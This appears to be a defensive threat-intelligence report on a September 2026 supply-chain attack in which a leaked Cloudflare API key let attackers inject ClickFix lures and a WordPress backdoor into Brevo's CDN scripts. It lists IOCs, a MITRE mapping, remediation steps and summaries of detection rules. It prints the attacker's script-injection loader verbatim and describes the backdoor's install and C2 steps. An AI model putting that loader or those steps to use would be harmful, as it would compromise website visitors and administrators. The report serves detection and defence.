# Brevo Supply-Chain Attack: ClickFix Injection via Compromised Cloudflare API Key

**Date:** 2026-09-20
**Status:** DRAFT
**TLP:** CLEAR
**Author:** Actioner

---

## Executive Summary

On September 14, 2026, attackers exploited a compromised Cloudflare API key belonging to Brevo (formerly Sendinblue) to deploy a malicious Cloudflare Worker that injected ClickFix social-engineering scripts into Brevo's own websites and three JavaScript files embedded across over 100,000 customer websites. The attack was active for approximately 5.5 hours (16:05-20:13 UTC). Visitors were shown fake Cloudflare "verify you are human" prompts instructing them to execute clipboard-injected commands via Win+R. On WordPress sites, the attack additionally attempted to install a persistent backdoor plugin called "Web Media Optimizer." The root cause was a long-lived Cloudflare API key with full account permissions that had been hardcoded in application source code.

---

## Background

Brevo is a French cloud-based marketing and customer communication platform used by major brands including eBay, Louis Vuitton, and Michelin. Brevo provides embeddable JavaScript widgets for forms, conversations, and SDK functionality that customers include on their websites.

The attack chain began with an initial compromise on September 10 through a vulnerability in Brevo's SAML SSO system, which gave attackers access to 138 accounts (including cryptocurrency hardware wallet maker Trezor). When Brevo blocked that access, the attackers returned on September 14 using the separately obtained Cloudflare API key. Attacker infrastructure preparation began as early as August 25, 2026, when a certificate was created for cdn[.]sendibt1[.]com.

---

## Technical Analysis

### Attack Chain

1. **Initial Access (T1195.002):** Attackers obtained a long-lived Cloudflare API key with full account permissions that was hardcoded in Brevo's application source code.

2. **Infrastructure Setup (Aug 25 - Sep 14):** Attackers created DNS records and TLS certificates for malicious subdomains under `sendibt1[.]com`, a legitimate Brevo tracking domain. Multiple CDN-prefixed subdomains were created (cdn, cdn2, cdn3, cdn4, cdn9, cdn10, cdn11).

3. **Execution (Sep 14, 16:05-20:13 UTC):** A malicious Cloudflare Worker was deployed that:
   - Modified CDN-served responses at the edge
   - Removed Content-Security-Policy headers from responses
   - Injected malicious JavaScript loader code into three customer-facing scripts:
     - `https://cdn[.]brevo[.]com/js/sdk-loader.js`
     - `https://cdn[.]brevo[.]com/js/brevo-conversations.js`
     - `https://conversations-widget[.]brevo[.]com/brevo-conversations.js`

4. **ClickFix Social Engineering (T1204.001):** The injected code loaded `f.js` from attacker-controlled subdomains, which:
   - Performed visitor fingerprinting via C2 API endpoints
   - Obtained proof-of-work tokens for anti-analysis
   - Displayed a full-screen fake Cloudflare verification page
   - Instructed visitors to press Win+R, Ctrl+V, then Enter -- executing a clipboard-injected command

5. **WordPress Backdoor (T1505.004):** On WordPress sites with Brevo widgets, the script:
   - Checked if the visitor was logged in as a WordPress administrator
   - Silently downloaded `wm.zip` from `cdn10[.]sendibt1[.]com/p/wm.zip`
   - Installed it via `/wp-admin/update.php?action=upload-plugin`
   - Activated the "Web Media Optimizer" plugin
   - The plugin hid itself from the WordPress plugin list
   - Copied itself to the `mu-plugins` directory for persistence
   - Established periodic C2 communication with `glegchner[.]com/ads.php`
   - Contained a hardcoded authentication mechanism to generate admin sessions without passwords

### Evasion Techniques

- Targeted only logged-in WordPress admins
- Ignored crawlers, developers, and security scanners
- Used legitimate Brevo infrastructure (sendibt1[.]com) for malware hosting
- CSP headers were stripped by the Cloudflare Worker to prevent policy violations

---

## Indicators of Compromise (IOCs)

All network indicators are defanged.

### Malicious Domains

| Domain | Purpose |
|--------|---------|
| sendibt1[.]com | Brevo-owned domain abused for malware hosting |
| cdn[.]sendibt1[.]com | Malicious script/content delivery |
| cdn2[.]sendibt1[.]com | Malicious f.js loader |
| cdn3[.]sendibt1[.]com | Malicious infrastructure |
| cdn4[.]sendibt1[.]com | Malicious infrastructure |
| cdn9[.]sendibt1[.]com | Malicious f.js loader (IP: 188[.]114[.]97[.]3) |
| cdn10[.]sendibt1[.]com | WordPress backdoor distribution |
| cdn11[.]sendibt1[.]com | Malicious f.js loader |
| glegchner[.]com | C2 server for WordPress backdoor |
| corralos[.]beer | ClickFix lure JavaScript delivery |
| yelahaye[.]surf | Malware/plugin distribution |
| boiseno[.]club | Malware/plugin distribution |

### IP Addresses

| IP | Association |
|----|-------------|
| 104[.]21[.]77[.]104 | cdn[.]sendibt1[.]com |
| 188[.]114[.]97[.]3 | cdn9[.]sendibt1[.]com |

### Malicious URLs

| URL | Purpose |
|-----|---------|
| hxxps://cdn2[.]sendibt1[.]com/f.js | Primary malware loader |
| hxxps://cdn9[.]sendibt1[.]com/f.js | Malware loader variant |
| hxxps://cdn11[.]sendibt1[.]com/f.js | Malware loader variant |
| hxxps://cdn[.]sendibt1[.]com/f.js | Malware loader variant |
| hxxps://cdn10[.]sendibt1[.]com/p/wm.zip | WordPress backdoor plugin archive |
| hxxps://glegchner[.]com/ads.php | C2 callback endpoint |
| hxxps://corralos[.]beer/a412dkoq.js | ClickFix lure JavaScript |

### C2 API Endpoints (on sendibt1[.]com subdomains)

| Path | Purpose |
|------|---------|
| /f.js | Primary loader |
| /api/v1/0044d4a | Fingerprinting |
| /api/v1/e08a3c4 | Proof-of-work token |
| /api/v1/8e4c615 | Fingerprinting variant |
| /api/v1/f659473 | Proof-of-work token variant |
| /api/v1/4aff112?tk= | Clipboard command delivery |
| /api/v1/b832c14?e= | Event beacons |
| /api/v1/4ead0ff?tk= | Image beacon |
| /image.php?tk= | Image beacon |

### File Hashes (SHA-256)

| Hash | Description |
|------|-------------|
| f359ab0d2f732b54dd3300065f4d6553f4df1b67454b71fd81197e26f02af4a8 | "Web Media Optimizer" WordPress backdoor plugin |
| 58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308 | Injected sdk-loader.js variant 1 |
| f67d572d2d30407b3f470904326411450763108980cdad89550fbb221fb06782 | Injected sdk-loader.js variant 2 |
| 9b62c12bc5c7feb9802f58e6cf75a368690df3c754e37cc64483a92acacf87a5 | Injected brevo-conversations.js |
| 4af488d79aef7daa12b1c18f0cce28b7edadccb8b6b0fb8d50d1d53a9a7c2df7 | Cloaking/evasion response |

### Compromised Brevo Assets

| URL | Type |
|-----|------|
| hxxps://cdn[.]brevo[.]com/js/sdk-loader.js | Modified SDK loader |
| hxxps://cdn[.]brevo[.]com/js/brevo-conversations.js | Modified conversations widget |
| hxxps://conversations-widget[.]brevo[.]com/brevo-conversations.js | Modified conversations widget |

### Affected Brevo Domains

- brevo[.]com
- sendinblue[.]com
- login[.]brevo[.]com / account[.]brevo[.]com / my[.]brevo[.]com / onboarding[.]brevo[.]com
- sibforms[.]com

### JavaScript Injection Pattern

```javascript
(function(){var s=document.createElement("script");s.src="https://cdn2.sendibt1.com/f.js";
s.async=true;var h=document.head||document.documentElement;h.appendChild(s)})();
```

### WordPress Attack Indicators

- HTTP POST to `/wp-admin/update.php?action=upload-plugin` from non-admin sources
- HTTP GET to `/wp-admin/plugins.php?action=activate` shortly after suspicious upload
- Plugin name: "Web Media Optimizer"
- Plugin self-copies to `mu-plugins` directory
- C2 callback to `glegchner[.]com/ads.php`

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|----|-------------|
| Compromise Software Supply Chain | T1195.002 | Attacker compromised Brevo's Cloudflare account to modify CDN-served JavaScript files embedded across 100k+ customer sites |
| JavaScript / Command and Scripting Interpreter | T1059.007 | Malicious JavaScript injected into legitimate Brevo scripts to load attacker-controlled code |
| User Execution: Malicious Link | T1204.001 | ClickFix social engineering prompted users to execute clipboard-injected commands |
| Application Layer Protocol: Web Protocols | T1071.001 | C2 communication via HTTPS API endpoints on sendibt1[.]com subdomains |
| Server Software Component: IIS Components | T1505.004 | WordPress backdoor plugin "Web Media Optimizer" installed as must-use plugin for persistence |
| Boot or Logon Initialization Scripts | T1547.009 | Must-use plugin persistence mechanism in WordPress |
| Account Manipulation | T1098 | Hardcoded WordPress admin authentication key in backdoor plugin |
| Subvert Trust Controls | T1553 | Removal of Content-Security-Policy headers by malicious Cloudflare Worker |

---

## Detection & Remediation

### Immediate Actions

1. **Review web proxy/DNS logs** for connections to `sendibt1[.]com`, `glegchner[.]com`, `corralos[.]beer`, `yelahaye[.]surf`, and `boiseno[.]club` between August 25 and September 15, 2026.
2. **WordPress administrators** should check for the "Web Media Optimizer" plugin, inspect the `mu-plugins` directory for unauthorized entries, and compare the filesystem plugin list against the admin interface.
3. **Endpoint teams** should scan devices of users who visited affected websites during the attack window for malware delivered via the ClickFix prompt.
4. **Rotate credentials** for any WordPress admin accounts that may have been active on sites embedding Brevo widgets during the attack window.

### Preventive Measures

1. **Subresource Integrity (SRI):** Implement SRI hashes on all third-party JavaScript includes to detect modifications.
2. **Content Security Policy:** Deploy strict CSP headers and monitor violation reports (2,549 CSP violation reports were recorded across 12 monitored sites during the attack).
3. **API Key Management:** Never hardcode long-lived API keys with full account permissions in source code; use scoped, short-lived tokens and secrets management.
4. **Monitor for ClickFix patterns:** Alert on pages displaying "verify you are human" overlays combined with Win+R/Ctrl+V instruction patterns.

---

## Detection Rules

### Sigma Rules

#### 1. Brevo Supply Chain Attack - Malicious Domain Access
<!-- audit: IOC-anchored detection on attacker-controlled domains from BleepingComputer and Sansec reports. All domains confirmed as malicious infrastructure. sigma convert to splunk and log_scale exit 0. sigma check blocked by proxy (MITRE data fetch 403). -->

Detects HTTP proxy requests to the attacker-controlled domains used in the Brevo supply chain attack.

- **File:** `/tmp/actioner/brevo-clickfix-malicious-domains.yml`
- **Compile:** Splunk PASS | LogScale PASS | sigma check: environment blocked (MITRE data fetch 403)
- **Confidence:** HIGH (IOC-anchored)

#### 2. Brevo Supply Chain Attack - Malicious JavaScript Loader Pattern
<!-- audit: IOC-anchored detection on specific malware delivery URLs (f.js loader, wm.zip backdoor). Exact paths from Sansec research. sigma convert to splunk and log_scale exit 0. -->

Detects requests to the specific malicious f.js loader and wm.zip backdoor URLs on sendibt1[.]com subdomains.

- **File:** `/tmp/actioner/brevo-clickfix-js-injection.yml`
- **Compile:** Splunk PASS | LogScale PASS | sigma check: environment blocked
- **Confidence:** HIGH (IOC-anchored)

#### 3. Brevo Supply Chain Attack - C2 API Endpoint Access
<!-- audit: IOC-anchored detection combining sendibt1.com domain with specific C2 API paths from Sansec technical analysis. Requires both domain and API path match. sigma convert to splunk and log_scale exit 0. -->

Detects C2 API endpoint access patterns used by the ClickFix malware for fingerprinting and command delivery.

- **File:** `/tmp/actioner/brevo-clickfix-c2-api.yml`
- **Compile:** Splunk PASS | LogScale PASS | sigma check: environment blocked
- **Confidence:** HIGH (IOC-anchored)

#### 4. Brevo Supply Chain Attack - WordPress Plugin Upload Attempt
<!-- audit: TTP-based detection combining WordPress upload endpoint with Brevo-linked referers. Medium confidence due to legitimate plugin upload scenarios from Brevo-integrated sites. sigma convert to splunk and log_scale exit 0. -->

Detects WordPress admin plugin upload requests with referers from Brevo-associated domains, indicating potential backdoor installation.

- **File:** `/tmp/actioner/brevo-clickfix-wp-backdoor.yml`
- **Compile:** Splunk PASS | LogScale PASS | sigma check: environment blocked
- **Confidence:** MEDIUM (TTP/behavioral)

### Snort Rules

#### 5. Brevo Supply Chain - Network Domain Detection (7 rules)
<!-- audit: 7 IOC-anchored rules detecting HTTP Host header matches for attacker domains and specific URI patterns for f.js and wm.zip. Snort 2.9.20 validated with exit 0 via /etc/snort/snort.conf. -->

Network-level detection for HTTP traffic to attacker-controlled domains and specific malware delivery paths.

- **File:** `/tmp/actioner/brevo-clickfix-domains.rules`
- **SIDs:** 2100001-2100007
- **Compile:** PASS (snort -T exit 0)
- **Confidence:** HIGH (IOC-anchored)

### Suricata Rules

#### 6. Brevo Supply Chain - Suricata Domain and C2 Detection (9 rules)
<!-- audit: 9 IOC-anchored rules using Suricata dot-notation sticky buffers (http.host, http.uri). Suricata 7.0.3 validated with exit 0. -->

Suricata rules with dot-notation buffers for domain-level detection, specific malware paths, and C2 API endpoint matching.

- **File:** `/tmp/actioner/brevo-clickfix-domains.suricata.rules`
- **SIDs:** 2200001-2200009
- **Compile:** PASS (suricata -T exit 0)
- **Confidence:** HIGH (IOC-anchored)

### YARA Rules

#### 7. Brevo ClickFix JS Injection (3 rules)
<!-- audit: 3 YARA rules detecting: (1) JavaScript injection pattern with sendibt1.com loader, (2) Web Media Optimizer WordPress backdoor with C2 strings, (3) C2 API path patterns. yara validation exit 0. -->

File-level detection for the injected JavaScript loader pattern, the WordPress backdoor plugin, and C2 API communication patterns.

- **File:** `/tmp/actioner/brevo-clickfix-injection.yar`
- **Rules:** Brevo_ClickFix_JS_Injection, Brevo_ClickFix_WP_Backdoor, Brevo_ClickFix_C2_Communication
- **Compile:** PASS (yara exit 0)
- **Confidence:** HIGH (IOC-anchored strings)

---

## Sources

- [BleepingComputer - Brevo supply-chain attack injected ClickFix scripts on customer sites](https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/)
- [Sansec - Brevo supply chain attack hits 100k+ sites with WordPress backdoors and ClickFix malware](https://sansec.io/research/brevo-supply-chain-attack)
- [SecurityWeek - Brevo Supply Chain Attack Injects Malware Into 100,000 Websites](https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/)
- [SecurityAffairs - Brevo Supply-Chain Attack Infected Over 100,000 Websites](https://securityaffairs.com/199355/hacking/brevo-supply-chain-attack-infected-over-100000-websites.html)
- [CyberInsider - 100,000+ WordPress sites infected via Brevo supply chain attack](https://cyberinsider.com/100000-wordpress-sites-infected-via-brevo-supply-chain-attack/)
- [CyberPress - Attackers Abuse Brevo CDN and DNS to Inject Malicious JavaScript](https://cyberpress.org/brevo-cdn-javascript-injection/)
